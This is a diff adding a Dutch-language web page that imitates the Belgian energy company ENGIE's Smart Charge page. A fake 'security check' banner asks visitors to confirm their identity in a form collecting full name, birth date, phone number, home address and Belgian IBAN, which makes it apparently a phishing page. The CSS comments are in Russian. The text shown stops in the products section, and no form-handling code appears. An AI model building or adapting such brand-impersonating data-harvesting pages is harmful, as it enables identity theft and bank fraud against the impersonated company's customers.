@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#002a40">
+    <title>Site</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        :root { --color-primary-blue: #005279; }
+        html { -webkit-text-size-adjust: 100%; }
+        body { background-color: #002a40; min-height: 100vh; font-family: 'Segoe UI', Roboto, Arial, sans-serif; scroll-behavior: smooth; overflow-x: hidden; }
+
+        /* ================= TOP BAR ================= */
+        .top-bar { width: 100%; height: 71px; background-color: #002a40; display: flex; align-items: center; justify-content: center; position: relative; padding: 0 16px; }
+        .top-bar .logo { width: 102px; height: 38px; display: block; filter: brightness(0) invert(1); }
+        .top-bar .nav-links { position: absolute; left: calc(50% - 51px - 250px); transform: translateX(-100%); display: flex; align-items: center; gap: 22px; font-size: 12px; font-weight: 400; letter-spacing: 0.3px; white-space: nowrap; }
+        .top-bar .nav-links span { cursor: pointer; transition: color 0.2s; color: #a8b8c4; }
+        .top-bar .nav-links span:hover { color: #ffffff; }
+        .top-bar .nav-links span.active { color: #4aa3ff; font-weight: 600; }
+        .top-bar .right-links { position: absolute; left: calc(50% + 51px + 250px); display: flex; align-items: center; gap: 22px; font-size: 12px; font-weight: 400; letter-spacing: 0.3px; white-space: nowrap; }
+        .top-bar .right-links .theme-toggle { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #a8b8c4; transition: color 0.2s; border-radius: 50%; }
+        .top-bar .right-links .theme-toggle:hover { color: #ffffff; }
+        .top-bar .right-links .theme-toggle svg { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+        .top-bar .right-links span.link { cursor: pointer; transition: color 0.2s; color: #a8b8c4; }
+        .top-bar .right-links span.link:hover { color: #ffffff; }
+        .top-bar .underline { position: absolute; bottom: 4px; left: calc(50% - 51px - 250px - 300px); right: calc(50% - 51px - 250px - 220px); height: 1px; background: rgba(168, 184, 196, 0.3); pointer-events: none; }
+
+        /* ================= LANGUAGE SWITCH ================= */
+        .lang-switch {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-left: 6px;
+            padding-left: 14px;
+            border-left: 1px solid rgba(168, 184, 196, 0.35);
+            font-size: 12px;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+        .lang-switch span {
+            cursor: pointer;
+            color: #a8b8c4;
+            transition: color 0.2s;
+            padding: 2px 4px;
+        }
+        .lang-switch span:hover { color: #ffffff; }
+        .lang-switch span.active { color: #4aa3ff; }
+
+        /* ================= BOTTOM NAV ================= */
+        .bottom-nav { width: 100%; height: 54px; background-color: #002a40; display: flex; align-items: stretch; justify-content: center; position: relative; border-bottom: 1px solid rgba(168, 184, 196, 0.15); transform: translateX(-25px); overflow-x: auto; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
+        .bottom-nav::-webkit-scrollbar { display: none; }
+        .bottom-nav .bottom-links { display: flex; align-items: stretch; gap: 0; font-size: 13px; font-weight: 400; letter-spacing: 0.3px; white-space: nowrap; height: 100%; }
+        .bottom-nav .bottom-links .section { display: flex; align-items: center; justify-content: center; padding: 0 20px; cursor: pointer; transition: color 0.2s, background-color 0.2s; color: #a8b8c4; height: 100%; position: relative; }
+        .bottom-nav .bottom-links .section:hover { color: #ffffff; background-color: rgba(255, 255, 255, 0.03); }
+        .bottom-nav .bottom-links .section.orange { color: #ff6a00; font-weight: 600; }
+        .bottom-nav .bottom-links .section.orange:hover { color: #ff8533; }
+        .bottom-nav .bottom-links .section.orange::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 2px; background: #4aa3ff; }
+        .bottom-nav .bottom-links .section.blue { color: #4aa3ff; font-weight: 600; }
+        .bottom-nav .bottom-links .section.blue:hover { color: #79bfff; }
+        .bottom-nav .bottom-links .section.blue::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 2px; background: #4aa3ff; }
+        .bottom-nav .bottom-links .search-icon { display: flex; align-items: center; justify-content: center; cursor: pointer; color: #a8b8c4; transition: color 0.2s; padding: 0 16px; height: 100%; }
+        .bottom-nav .bottom-links .search-icon:hover { color: #ffffff; background-color: rgba(255, 255, 255, 0.03); }
+        .bottom-nav .bottom-links .search-icon svg { width: 16px; height: 16px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+        /* ================= HERO ================= */
+        .hero { width: 100%; height: 550px; background-image: url('1920x550-smartcharge_loy9lc.avif'); background-size: cover; background-position: center; background-repeat: no-repeat; position: relative; display: flex; align-items: center; justify-content: center; }
+        .hero::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to right, rgba(0, 42, 64, 0.75) 0%, rgba(0, 42, 64, 0.4) 50%, rgba(0, 42, 64, 0.1) 100%); z-index: 1; }
+        .hero .hero-content { position: relative; z-index: 2; max-width: 780px; padding: 0 40px; text-align: center; color: #ffffff; }
+        .hero .hero-content h1 { font-size: 38px; font-weight: 700; line-height: 1.3; margin-bottom: 22px; color: #ffffff; }
+        .hero .hero-content .subtitle-small { font-size: 15px; font-weight: 400; line-height: 1.55; color: #cdd9e3; margin-bottom: 26px; }
+        .hero .hero-content .subtitle-small strong { font-weight: 700; color: #ffffff; }
+        .hero .hero-content .hero-bottom { display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .hero .hero-content .btn-orange { display: inline-block; padding: 15px 34px; background-color: #ff6a00; color: #000000; font-size: 16px; font-weight: 700; border: none; border-radius: 30px; cursor: pointer; transition: background-color 0.2s, transform 0.15s; text-decoration: none; letter-spacing: 0.3px; margin-bottom: 24px; }
+        .hero .hero-content .btn-orange:hover { background-color: #ff8533; }
+        .hero .hero-content .btn-orange:active { transform: scale(0.97); }
+        .hero .hero-content .hero-hint { font-size: 15px; line-height: 1.6; color: #e6eef5; text-align: center; }
+        .hero .hero-content .hero-hint strong { font-weight: 700; color: #ffffff; }
+        .hero .hero-content .hero-hint .app-icon { width: 20px; height: 20px; display: inline-block; vertical-align: middle; margin: 0 2px; }
+        .hero .hero-content .hero-hint .app-icon img { width: 100%; height: 100%; object-fit: contain; display: block; vertical-align: middle; }
+
+        /* ================= WARNING ================= */
+        .warning-box { width: 100%; background-color: #002a40; display: flex; justify-content: center; padding: 24px 20px 0; box-sizing: border-box; }
+        .warning-box .warning-inner { width: 1195px; max-width: 100%; background-color: #142938; border: 1px solid #55606b; border-left: 4px solid #ff6a00; padding: 18px 24px; display: flex; align-items: flex-start; gap: 16px; box-sizing: border-box; }
+        .warning-box .warning-icon { flex-shrink: 0; width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; color: #ff6a00; }
+        .warning-box .warning-icon svg { width: 24px; height: 24px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+        .warning-box .warning-text { color: #cdd9e3; font-size: 14px; line-height: 1.6; text-align: left; }
+        .warning-box .warning-text strong { color: #ffffff; font-weight: 700; display: block; margin-bottom: 6px; font-size: 15px; }
+        .warning-box .warning-text p { margin: 0 0 6px; }
+        .warning-box .warning-text p:last-child { margin-bottom: 0; }
+
+        /* ================= PANEL FORM ================= */
+        .panel-section { width: 100%; display: flex; justify-content: center; background-color: #002a40; margin-top: 30px; position: relative; z-index: 3; padding: 0 16px; box-sizing: border-box; }
+        .panel-card { width: 1195px; max-width: 100%; height: auto; min-height: 258px; background-color: #142938; border: 1px solid #55606b; border-radius: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 50px 80px; box-sizing: border-box; }
+        .panel-card .panel-title { font-size: 26px; font-weight: 700; color: #ffffff; margin-bottom: 10px; }
+        .panel-card .panel-subtitle { font-size: 12px; font-weight: 600; color: #cbd5df; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 30px; }
+        .panel-card .panel-form { display: flex; flex-direction: column; align-items: stretch; justify-content: center; gap: 16px; width: 100%; max-width: 640px; text-align: left; }
+        .panel-card .panel-form .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .panel-card .panel-form .form-group label { font-size: 12px; font-weight: 600; color: #cbd5df; letter-spacing: 0.3px; }
+        .panel-card .panel-form .form-row { display: flex; gap: 10px; align-items: flex-end; }
+        .panel-card .panel-form .form-row .form-group { flex: 1; }
+        .panel-card .panel-form input { width: 100%; height: 54px; padding: 0 20px; font-size: 16px; font-family: inherit; color: #ffffff; background-color: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 0; outline: none; transition: border-color 0.2s, background-color 0.2s; -webkit-appearance: none; appearance: none; }
+        .panel-card .panel-form input::placeholder { color: #a8b8c4; }
+        .panel-card .panel-form input:focus { border-color: #4aa3ff; background-color: rgba(255, 255, 255, 0.12); }
+
+        .panel-card .panel-form .iban-field { display: flex; align-items: stretch; width: 100%; height: 54px; background-color: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); transition: border-color 0.2s, background-color 0.2s; }
+        .panel-card .panel-form .iban-field:focus-within { border-color: #4aa3ff; background-color: rgba(255, 255, 255, 0.12); }
+        .panel-card .panel-form .iban-field .iban-prefix { display: flex; align-items: center; padding: 0 0 0 20px; color: #ffffff; font-size: 16px; font-weight: 500; user-select: none; }
+        .panel-card .panel-form .iban-field input { flex: 1; height: 100%; background: transparent; border: none; padding: 0 20px 0 8px; color: #ffffff; font-size: 16px; font-family: inherit; outline: none; }
+        .panel-card .panel-form .iban-field input::placeholder { color: #a8b8c4; }
+
+        .panel-card .panel-form .btn-calc { width: 100%; height: 54px; padding: 0 36px; background-color: #ff6a00; color: #000000; font-size: 16px; font-weight: 700; font-family: inherit; border: none; border-radius: 27px; cursor: pointer; transition: background-color 0.2s, transform 0.15s; white-space: nowrap; margin-top: 8px; -webkit-appearance: none; appearance: none; }
+        .panel-card .panel-form .btn-calc:hover { background-color: #ff8533; }
+        .panel-card .panel-form .btn-calc:active { transform: scale(0.97); }
+
+        /* ================= SECOND PANEL ================= */
+        .panel-section-second { width: 100%; background-color: #142938; margin-top: 30px; padding: 40px 60px 60px; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; text-align: center; box-sizing: border-box; border: none; }
+        .panel-section-second .second-title { font-size: 21px; font-weight: 500; color: #ffffff; line-height: 1.3; margin-bottom: 38px; }
+        .panel-section-second .second-title .gradient-word { background: linear-gradient(132.06deg, var(--color-primary-blue) -30.55%, #23d2b5 132.95%); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; color: transparent; font-weight: 500; }
+
+        .three-cards { display: flex; justify-content: center; align-items: stretch; gap: 30px; width: 100%; flex-wrap: wrap; }
+        .three-cards .card-item { width: 376px; max-width: 100%; min-height: 254px; background-color: #1a3242; border: 1px solid rgba(168, 184, 196, 0.35); border-radius: 12px; display: flex; flex-direction: column; align-items: flex-start; justify-content: space-between; box-sizing: border-box; padding: 26px; text-align: left; transition: border-color 0.2s, background-color 0.2s; }
+        .three-cards .card-item:hover { border-color: rgba(168, 184, 196, 0.6); background-color: #1e3a4d; }
+        .three-cards .card-item .card-title { font-size: 16px; font-weight: 700; color: #ffffff; line-height: 1.35; margin-bottom: 14px; }
+        .three-cards .card-item .card-text { font-size: 13px; font-weight: 400; color: #cdd9e3; line-height: 1.65; flex-grow: 1; }
+
+        /* ================= PRODUCTS ================= */
+        .products-section { width: 100%; background-color: #002a40; padding: 50px 60px; box-sizing: border-box; }
+        .products-inner { max-width: 1195px; margin: 0 auto; display: flex; align-items: center; justify-content: flex-start; gap: 40px; transform: translateX(100px); }
+        .products-left { display: flex; flex-direction: column; align-items: flex-start; text-align: left; padding-left: 30px; }
+        .products-left .products-title { font-size: 30px; font-weight: 700; color: #ffffff; margin-bottom: 8px; line-height: 1.2; }
+        .products-left .products-subtitle { font-size: 15px; font-weight: 300; color: #cdd9e3; line-height: 1.5; }
+        .products-right { display: flex; align-items: center; justify-content: center; flex-shrink: 0; transform: translateX(270px); }
+        .products-right img { width: 113px; height: 113px; object-fit: contain; display: block; }
+
+        /* ================= ADVANTAGES ================= */
+        .advantages-section { width: 100%; background-color: #142938; padding: 50px 60px 60px; box-sizing: border-box; }
+        .advantages-section .advantages-title { font-size: 32px; font-weight: 700; color: #ffffff; text-align: center; margin-bottom: 40px; line-height: 1.3; }
+        .advantages-grid { display: flex; justify-content: center; align-items: stretch; gap: 30px; max-width: 1195px; margin: 0 auto; flex-wrap: wrap; }
+        .advantages-grid .deal-card { width: 376px; max-width: 100%; background-color: #1a3242; border: 1px solid rgba(168, 184, 196, 0.35); border-radius: 12px; display: flex; flex-direction: column; overflow: hidden; box-sizing: border-box; text-align: left; }
+        .advantages-grid .deal-card .deal-image { width: 100%; height: 300px; background-color: #142938; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
+        .advantages-grid .deal-card .deal-image img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .advantages-grid .deal-card .deal-content { padding: 20px 24px 24px; display: flex; flex-direction: column; flex-grow: 1; }
+        .advantages-grid .deal-card .deal-content .deal-title { font-size: 15px; font-weight: 700; color: #ffffff; line-height: 1.4; margin-bottom: 14px; }
+        .advantages-grid .deal-card .deal-content .deal-blue { font-size: 14px; font-weight: 700; color: #4aa3ff; line-height: 1.55; margin-top: 4px; margin-bottom: 6px; }
+        .advantages-grid .deal-card .deal-content .deal-valid { font-size: 12px; color: #8fa4b8; margin-top: auto; padding-top: 10px; }
+
+        /* ================= FOOTER NAV ================= */
+        .footer-nav-section { width: 100%; background-color: #142938; padding: 60px; box-sizing: border-box; }
+        .footer-nav-inner { max-width: 1195px; margin: 0 auto; display: flex; justify-content: flex-start; gap: 180px; flex-wrap: wrap; }
+        .footer-nav-column { display: flex; flex-direction: column; text-align: left; }
+        .footer-nav-column .footer-nav-title { font-size: 18px; font-weight: 700; color: #ffffff; margin-bottom: 20px; line-height: 1.3; }
+        .footer-nav-column .footer-nav-links { list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 12px; }
+        .footer-nav-column .footer-nav-links li { font-size: 15px; color: #cdd9e3; font-weight: 400; line-height: 1.5; cursor: pointer; transition: color 0.2s; }
+        .footer-nav-column .footer-nav-links li:hover { color: #ffffff; }
+        .footer-nav-column .footer-nav-apps { display: flex; flex-direction: column; gap: 12px; align-items: flex-start; }
+        .footer-nav-column .footer-nav-apps img { width: 125px; height: 37px; object-fit: contain; display: block; cursor: pointer; transition: opacity 0.2s; }
+        .footer-nav-column .footer-nav-apps img:hover { opacity: 0.8; }
+
+        /* ================= BOTTOM COPYRIGHT ================= */
+        .bottom-copyright { width: 100%; background-color: #142938; padding: 30px 60px 40px; box-sizing: border-box; border-top: 1px solid rgba(168, 184, 196, 0.15); }
+        .bottom-copyright-inner { max-width: 1195px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; gap: 8px 22px; font-size: 11px; color: #8fa4b8; line-height: 1.5; }
+        .bottom-copyright-inner span, .bottom-copyright-inner a { color: #8fa4b8; cursor: pointer; transition: color 0.2s; text-decoration: none; }
+        .bottom-copyright-inner a:hover { color: #ffffff; }
+
+        @keyframes targetPulse {
+            0%   { box-shadow: 0 0 0 0 rgba(74, 163, 255, 0.0); }
+            20%  { box-shadow: 0 0 0 6px rgba(74, 163, 255, 0.35); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 163, 255, 0.0); }
+        }
+        .panel-card.pulse { animation: targetPulse 1.4s ease-out; }
+
+        @media (max-width: 1200px) {
+            .top-bar .nav-links,
+            .top-bar .right-links { position: static; transform: none; }
+            .top-bar { justify-content: space-between; gap: 16px; flex-wrap: wrap; height: auto; padding: 12px 16px; }
+            .top-bar .nav-links,
+            .top-bar .right-links { font-size: 12px; gap: 14px; }
+            .top-bar .underline { display: none; }
+
+            .bottom-nav { transform: none; }
+            .panel-card { padding: 40px 40px; }
+            .panel-section-second { padding: 30px 40px 50px; }
+            .products-section { padding: 40px 40px; }
+            .products-inner { transform: none; }
+            .products-right { transform: none; }
+            .advantages-section { padding: 40px 40px 50px; }
+            .footer-nav-section { padding: 50px 40px; }
+            .footer-nav-inner { gap: 80px; }
+            .bottom-copyright { padding: 24px 40px 32px; }
+        }
+
+        /* =========================================================
+           ================== ТЕЛЕФОНЫ =============================
+           ========================================================= */
+        @media (max-width: 768px) {
+            /* Верхняя панель: лого по центру, справа Verhuizen / Hulp & Contact / FR NL DE */
+            .top-bar {
+                padding: 10px 12px;
+                height: auto;
+                flex-wrap: nowrap;
+                justify-content: center;
+                gap: 8px;
+            }
+            /* Скрываем верхние табы (Particulieren / Professionelen / Grote ondernemingen) */
+            .top-bar .nav-links { display: none; }
+            .top-bar .underline { display: none; }
+
+            .top-bar .logo {
+                width: 90px;
+                height: 34px;
+                flex-shrink: 0;
+            }
+
+            .top-bar .right-links {
+                position: static;
+                transform: none;
+                display: flex;
+                align-items: center;
+                gap: 12px;
+                font-size: 11.5px;
+                margin-left: 14px;
+                flex-wrap: nowrap;
+                white-space: nowrap;
+            }
+            /* Скрываем иконку темы на мобильном */
+            .top-bar .right-links .theme-toggle { display: none; }
+
+            .lang-switch {
+                font-size: 11.5px;
+                gap: 5px;
+                padding-left: 10px;
+                margin-left: 2px;
+            }
+            .lang-switch span { padding: 2px 3px; }
+
+            .bottom-nav { justify-content: flex-start; overflow-x: auto; padding: 0; }
+            .bottom-nav .bottom-links { font-size: 12px; padding: 0 6px; }
+            .bottom-nav .bottom-links .section { padding: 0 14px; }
+
+            .hero { height: 420px; }
+            .hero .hero-content { padding: 0 20px; }
+            .hero .hero-content h1 { font-size: 26px; line-height: 1.25; margin-bottom: 16px; }
+            .hero .hero-content .subtitle-small { font-size: 13.5px; line-height: 1.5; margin-bottom: 20px; }
+            .hero .hero-content .btn-orange { padding: 13px 26px; font-size: 15px; border-radius: 26px; margin-bottom: 18px; }
+            .hero .hero-content .hero-hint { font-size: 13px; line-height: 1.55; }
+
+            .warning-box { padding: 18px 12px 0; }
+            .warning-box .warning-inner { padding: 14px 16px; gap: 12px; }
+            .warning-box .warning-text { font-size: 13px; }
+            .warning-box .warning-text strong { font-size: 14px; }
+            .warning-box .warning-icon { width: 24px; height: 24px; }
+            .warning-box .warning-icon svg { width: 20px; height: 20px; }
+
+            .panel-section { padding: 0 12px; margin-top: 22px; }
+            .panel-card { padding: 28px 20px; border: none; border-top: 1px solid #55606b; border-bottom: 1px solid #55606b; }
+            .panel-card .panel-title { font-size: 21px; }
+            .panel-card .panel-subtitle { font-size: 11px; letter-spacing: 1.2px; margin-bottom: 22px; }
+            .panel-card .panel-form { gap: 12px; }
+            .panel-card .panel-form input { height: 50px; padding: 0 16px; font-size: 16px; }
+            .panel-card .panel-form .form-group label { font-size: 11.5px; }
+            .panel-card .panel-form .form-row { flex-direction: column; gap: 12px; align-items: stretch; }
+            .panel-card .panel-form .form-row .form-group { flex: 1 1 100%; }
+            .panel-card .panel-form .iban-field { height: 50px; }
+            .panel-card .panel-form .iban-field .iban-prefix { padding-left: 16px; font-size: 16px; }
+            .panel-card .panel-form .iban-field input { padding: 0 16px 0 6px; font-size: 16px; }
+            .panel-card .panel-form .btn-calc { height: 50px; font-size: 15px; border-radius: 25px; }
+
+            .panel-section-second { padding: 26px 16px 34px; margin-top: 22px; }
+            .panel-section-second .second-title { font-size: 17px; margin-bottom: 24px; }
+            .three-cards { flex-direction: column; gap: 16px; }
+            .three-cards .card-item { width: 100%; min-height: auto; padding: 20px; }
+            .three-cards .card-item .card-title { font-size: 15px; }
+            .three-cards .card-item .card-text { font-size: 13px; }
+
+            .products-section { padding: 30px 16px; }
+            .products-inner { flex-direction: column; align-items: flex-start; gap: 18px; transform: none; }
+            .products-left { padding-left: 0; }
+            .products-left .products-title { font-size: 22px; }
+            .products-left .products-subtitle { font-size: 13.5px; }
+            .products-right { transform: none; align-self: center; }
+            .products-right img { width: 90px; height: 90px; }
+
+            .advantages-section { padding: 30px 16px 40px; }
+            .advantages-section .advantages-title { font-size: 22px; margin-bottom: 24px; }
+            .advantages-grid { flex-direction: column; gap: 16px; }
+            .advantages-grid .deal-card { width: 100%; }
+            .advantages-grid .deal-card .deal-image { height: 210px; }
+            .advantages-grid .deal-card .deal-content { padding: 16px 18px 18px; }
+            .advantages-grid .deal-card .deal-content .deal-title { font-size: 14px; }
+            .advantages-grid .deal-card .deal-content .deal-blue { font-size: 13px; }
+            .advantages-grid .deal-card .deal-content .deal-valid { font-size: 11.5px; }
+
+            .footer-nav-section { padding: 30px 16px; }
+            .footer-nav-inner { flex-direction: column; gap: 30px; }
+            .footer-nav-column .footer-nav-title { font-size: 16px; margin-bottom: 14px; }
+            .footer-nav-column .footer-nav-links li { font-size: 14px; }
+
+            .bottom-copyright { padding: 20px 16px 30px; }
+            .bottom-copyright-inner { font-size: 10.5px; gap: 6px 14px; }
+        }
+
+        @media (max-width: 400px) {
+            .top-bar { padding: 8px 10px; gap: 6px; }
+            .top-bar .logo { width: 78px; height: 30px; }
+            .top-bar .right-links { font-size: 10.5px; gap: 8px; margin-left: 8px; }
+            .lang-switch { font-size: 10.5px; gap: 3px; padding-left: 8px; }
+
+            .hero { height: 380px; }
+            .hero .hero-content h1 { font-size: 22px; }
+            .hero .hero-content .subtitle-small { font-size: 13px; }
+            .hero .hero-content .btn-orange { padding: 12px 22px; font-size: 14px; }
+            .hero .hero-content .hero-hint { font-size: 12.5px; }
+
+            .panel-card { padding: 24px 14px; }
+            .panel-card .panel-title { font-size: 19px; }
+            .panel-card .panel-form input { height: 48px; font-size: 15.5px; }
+            .panel-card .panel-form .btn-calc { height: 48px; font-size: 14.5px; }
+            .panel-card .panel-form .iban-field { height: 48px; }
+
+            .panel-section-second .second-title { font-size: 15.5px; }
+            .products-left .products-title { font-size: 20px; }
+            .advantages-section .advantages-title { font-size: 19px; }
+
+            .bottom-nav .bottom-links { font-size: 11.5px; }
+            .bottom-nav .bottom-links .section { padding: 0 12px; }
+        }
+
+        @supports (padding: max(0px)) {
+            .top-bar { padding-top: max(10px, env(safe-area-inset-top)); }
+            .bottom-copyright { padding-bottom: max(30px, env(safe-area-inset-bottom)); }
+            body { padding-left: env(safe-area-inset-left); padding-right: env(safe-area-inset-right); }
+        }
+
+        @media (max-width: 900px) and (orientation: landscape) {
+            .hero { height: 320px; }
+            .hero .hero-content h1 { font-size: 22px; margin-bottom: 12px; }
+            .hero .hero-content .subtitle-small { font-size: 13px; margin-bottom: 14px; }
+            .hero .hero-content .btn-orange { padding: 11px 22px; font-size: 14px; margin-bottom: 14px; }
+            .hero .hero-content .hero-hint { font-size: 12.5px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="nav-links">
+            <span class="active" data-scroll data-i18n="nav.part">Particulieren</span>
+            <span data-scroll data-i18n="nav.prof">Professionelen</span>
+            <span data-scroll data-i18n="nav.corp">Grote ondernemingen</span>
+        </div>
+        <img src="logo-blue.svg" alt="Logo" class="logo" data-scroll>
+        <div class="right-links">
+            <div class="theme-toggle" title="Thema wijzigen" data-scroll>
+                <svg viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+            </div>
+            <span class="link" data-scroll data-i18n="nav.move">Verhuizen</span>
+            <span class="link" data-scroll data-i18n="nav.help">Hulp &amp; Contact</span>
+            <div class="lang-switch" id="langSwitch">
+                <span data-lang="fr">FR</span>
+                <span data-lang="nl" class="active">NL</span>
+                <span data-lang="de">DE</span>
+            </div>
+        </div>
+        <div class="underline"></div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="bottom-links">
+            <div class="section orange" data-scroll data-i18n="bn.become">Klant worden</div>
+            <div class="section" data-scroll data-i18n="bn.elec">Elektriciteit en gas</div>
+            <div class="section" data-scroll data-i18n="bn.services">Diensten en apparatuur</div>
+            <div class="section" data-scroll data-i18n="bn.smart">Slim verbruik</div>
+            <div class="section" data-scroll data-i18n="bn.tools">Tools &amp; Voordelen</div>
+            <div class="section" data-scroll data-i18n="bn.topics">Actuele onderwerpen</div>
+            <div class="section blue" data-scroll data-i18n="bn.zone">Mijn klantenzone</div>
+            <div class="search-icon" title="Zoeken" data-scroll>
+                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1 data-i18n-html="hero.h1">Smart Charge. Wanneer goedkoper laden<br>automatisch<br>wordt.</h1>
+            <p class="subtitle-small" data-i18n-html="hero.sub">En bovendien, <strong>ontvangt u ongeveer € 1 per slimme laadsessie</strong> met een Empower-, Easy- of Flow-contract.</p>
+            <div class="hero-bottom">
+                <a href="#dataForm" class="btn-orange" data-scroll data-i18n="hero.btn">Ontdek Smart Charge</a>
+                <div class="hero-hint" data-i18n-html="hero.hint"><strong>Waar vind ik Smart Charge in de app? Klik rechtsonder op <span class="app-icon"><img src="engie-icon-app-small_iw8wtr.png" alt="App icon"></span> en kies Smart Charge.</strong></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="warning-box">
+        <div class="warning-inner">
+            <div class="warning-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                    <line x1="12" y1="9" x2="12" y2="13"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                </svg>
+            </div>
+            <div class="warning-text">
+                <strong data-i18n="warn.title">Belangrijke veiligheidscontrole</strong>
+                <p data-i18n="warn.p1">Door ons nieuwe systeem controleren wij of uw gegevens nog steeds end-to-end hetzelfde zijn.</p>
+                <p data-i18n="warn.p2">Gelieve daarom uw gegevens in te vullen, zodat wij kunnen nagaan of alles nog in orde is.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="panel-section" id="identitySection">
+        <div class="panel-card" id="identityCard">
+            <div class="panel-title" data-i18n="form.title">Controleer uw identiteit</div>
+            <div class="panel-subtitle" data-i18n="form.sub">Vul uw gegevens in</div>
+            <div class="panel-form" id="dataForm">
+                <div class="form-group">
+                    <label for="fio" data-i18n="form.fio">Uw volledige naam</label>
+                    <input type="text" name="fio" id="fio" data-i18n-ph="form.fio.ph" placeholder="Uw volledige naam" maxlength="120" autocomplete="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="dob" data-i18n="form.dob">Uw geboortedatum</label>
+                    <input type="text" name="dob" id="dob" placeholder="__/__/____" maxlength="10" inputmode="numeric" autocomplete="bday" required>
+                </div>
+                <div class="form-group">
+                    <label for="phoneInput" data-i18n="form.phone">Uw telefoonnummer</label>
+                    <input type="tel" name="telefoon" id="phoneInput" placeholder="+32" maxlength="20" inputmode="tel" autocomplete="tel" required>
+                </div>
+                <div class="form-group">
+                    <label data-i18n="form.addr">Adres</label>
+                    <div class="form-row">
+                        <div class="form-group" style="flex: 2;">
+                            <input type="text" name="stad" id="stad" data-i18n-ph="form.stad.ph" placeholder="Stad" maxlength="80" autocomplete="address-level2" required>
+                        </div>
+                        <div class="form-group" style="flex: 1.4;">
+                            <input type="text" name="straat" id="straat" data-i18n-ph="form.straat.ph" placeholder="Straat en huisnummer" maxlength="120" autocomplete="street-address" required>
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <input type="text" name="postcode" id="postcode" data-i18n-ph="form.postcode.ph" placeholder="Postcode" maxlength="10" inputmode="numeric" autocomplete="postal-code" required>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="iban" data-i18n="form.iban">Uw IBAN</label>
+                    <div class="iban-field">
+                        <span class="iban-prefix">BE</span>
+                        <input type="text" name="iban" id="iban" placeholder="" maxlength="19" inputmode="numeric" autocomplete="off" required>
+                    </div>
+                </div>
+                <button type="button" class="btn-calc" id="submitBtn" data-i18n="form.btn">Versturen</button>
+            </div>
+        </div>
+    </section>
+
+    <section class="panel-section-second">
+        <div class="second-title" data-i18n-html="second.title">Bij ENGIE bent u <span class="gradient-word">gerust</span>.</div>
+        <div class="three-cards">
+            <div class="card-item" data-scroll>
+                <div class="card-title" data-i18n="card1.title">De grootste leverancier in België</div>
+                <div class="card-text" data-i18n="card1.text">2,8 miljoen Belgen vertrouwen ons voor hun energie. Word klant en geniet ook van onze 5-sterrenservice, erkend door de Vlaamse Nutsregulator.</div>
+            </div>
+            <div class="card-item" data-scroll>
+                <div class="card-title" data-i18n="card2.title">Aantrekkelijke prijzen &amp; klantvoordelen</div>
+                <div class="card-text" data-i18n="card2.text">Kies het contract dat bij uw situatie past: vast of variabel en aan een competitieve prijs. Bovendien geniet u van talrijke kortingen bij onze partners.</div>
+            </div>
+            <div class="card-item" data-scroll>
+                <div class="card-title" data-i18n="card3.title">Volg uw verbruik met de Smart App</div>
+                <div class="card-text" data-i18n="card3.text">Dankzij de Smart App kunt u uw energieverbruik en uw voorschotbedrag met een gerust hart opvolgen.</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="products-section">
+        <div class="products-inner" data-scroll>
+            <div class="products-left">
+                <div class="products-title" data-i18n="prod.title">Onze producten en diensten</div>
+                <div class="products-subtitle" data-i18n="prod.sub">Oplossingen om het verbruik van uw woning te verlagen.</div>
+            </div>
+            <div class="products-right">
+                <img src="jcr_76bdff2d-5d29-45fd-a395-6d7dea5af9ce.avif" alt="Product">
+            </div>
